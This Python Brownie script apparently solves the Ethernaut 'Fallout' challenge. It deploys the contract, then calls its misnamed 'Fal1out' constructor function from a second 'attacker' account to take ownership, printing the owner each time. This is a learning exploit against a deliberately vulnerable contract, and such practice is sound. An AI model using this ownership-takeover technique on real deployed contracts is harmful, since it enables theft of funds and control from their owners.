from brownie import Fallout, network, config
from scripts.helpful import get_account, LOCAL_NETWORKS
import web3
from web3.middleware import geth_poa_middleware
import os


def deploy(account):
    publish = False
    if network.show_active() not in LOCAL_NETWORKS:
        publish = True
    contract = Fallout.deploy({"from": account}, publish_source=publish)
    print(
        f"Cotntract --Fallout-- deployed at {contract.address} from {account.address}"
    )
    return contract


def main():
    owner_account = get_account(0)
    attacker_account = get_account(1)
    print(f"Owner address: {owner_account}")
    print(f"Attacker address: {attacker_account}")
    contract = deploy(owner_account)
    print(f"Contract owner: {contract.owner()}")
    tx = contract.Fal1out({"from": owner_account})
    tx.wait(1)
    print(f"Contract owner: {contract.owner()}")
    tx = contract.Fal1out({"from": attacker_account})
    tx.wait(1)
    print(f"Contract owner: {contract.owner()}")


if __name__ == "__main__":
    main()
